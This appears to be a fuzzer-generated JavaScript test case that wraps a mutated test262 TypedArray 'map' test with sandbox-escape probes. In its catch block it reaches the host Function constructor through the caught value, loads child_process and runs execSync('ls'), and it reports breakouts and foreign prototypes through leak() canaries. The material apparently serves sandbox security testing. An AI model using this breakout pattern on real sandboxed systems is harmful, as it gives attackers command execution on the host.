try {
    testWithTypedArrayConstructors(function (TA) {
        let REPLACER = 23;
        var sample = new TA([
            40,
            41,
            42,
            43
        ]);
        var calls = 0;
        var result;
        Object.defineProperty(sample, 'constructor', {
            get: function () {
                let REPLACER = 23;
                calls++;
            }
        });
        result = sample.map(function () {
            throw () => {
                return () => {
                };
            };
            return 0;
        });
        assert.sameValue(calls, 1, 'called custom ctor get accessor once');
        assert.sameValue(Object.getPrototypeOf(result), Object.getPrototypeOf(sample), 'use defaultCtor on an undefined return - getPrototypeOf check');
        assert.sameValue(result.constructor, TA, 'use defaultCtor on an undefined return - .constructor check');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}